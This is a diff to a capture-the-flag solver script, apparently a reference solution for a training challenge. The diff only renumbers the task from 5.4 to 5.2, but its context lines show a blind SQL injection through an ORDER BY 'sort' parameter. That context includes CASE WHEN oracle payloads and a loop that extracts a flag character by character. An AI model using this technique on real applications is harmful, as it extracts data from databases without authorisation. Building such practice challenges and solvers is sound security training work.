@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# solvers/p5_4.py, Task 5.4 "The Royal Guard Rankings" canonical exploit.
+# solvers/p5_2.py, Task 5.2 "The Royal Guard Rankings" canonical exploit.
 #
 # challenges/phase5.py's p5_roster() route lists a public roster sorted by
 # a caller-supplied `sort` value, spliced straight into the ORDER BY clause
@@ -87,19 +87,19 @@ def char_ascii_at(pos: int) -> int:
 
 
 def main() -> int:
-    print(f"[p5_4] target: {ROUTE}")
+    print(f"[p5_2] target: {ROUTE}")
 
     # --- Step 1: detection, an invalid column reaches real SQL -----------
-    print("[p5_4] step 1: invalid sort column is rejected (sort reaches SQL)")
+    print("[p5_2] step 1: invalid sort column is rejected (sort reaches SQL)")
     _, err = _first_member("this_column_does_not_exist")
     if err:
         print(f"  ok: invalid column rejected -> {err!r}")
     else:
-        print("[p5_4] FAIL: invalid column was NOT rejected; sort may not reach SQL")
+        print("[p5_2] FAIL: invalid column was NOT rejected; sort may not reach SQL")
         return 1
 
     # --- Step 2: confirm the oracle gives a clean true/false signal -------
-    print("[p5_4] step 2: confirm the CASE ordering oracle")
+    print("[p5_2] step 2: confirm the CASE ordering oracle")
     true_first, _ = _first_member("(CASE WHEN 1=1 THEN name ELSE division END)")
     false_first, _ = _first_member("(CASE WHEN 1=2 THEN name ELSE division END)")
     print(f"  TRUE  (1=1) -> first row {true_first!r}")
@@ -107,11 +107,11 @@ def main() -> int:
     if true_first == TRUE_MARKER and false_first == FALSE_MARKER:
         print("  ok: oracle produces a crisp, observable true/false signal")
     else:
-        print("[p5_4] FAIL: oracle signal was not as expected")
+        print("[p5_2] FAIL: oracle signal was not as expected")
         return 1
 
     # --- Step 3: blind extraction of the flag ----------------------------
-    print("[p5_4] step 3: blind-extract the sealed flag off the ordering oracle")
+    print("[p5_2] step 3: blind-extract the sealed flag off the ordering oracle")
     chars = []
     pos = 1
     while True:
@@ -127,17 +127,17 @@ def main() -> int:
             break
     print()
     recovered = "".join(chars)
-    print(f"[p5_4] recovered flag: {recovered}")
+    print(f"[p5_2] recovered flag: {recovered}")
 
     if recovered == EXPECTED_FLAG:
         print(f"  ok: recovered flag matches: {recovered}")
     else:
-        print(f"[p5_4] FAIL: recovered {recovered!r}, expected {EXPECTED_FLAG!r}")
+        print(f"[p5_2] FAIL: recovered {recovered!r}, expected {EXPECTED_FLAG!r}")
         return 1
 
-    print("[p5_4] ok: invalid column rejected, ordering oracle confirmed,")
-    print("[p5_4]     flag blind-extracted through an ORDER BY identifier injection")
-    print("[p5_4] PASS")
+    print("[p5_2] ok: invalid column rejected, ordering oracle confirmed,")
+    print("[p5_2]     flag blind-extracted through an ORDER BY identifier injection")
+    print("[p5_2] PASS")
     return 0
 
 
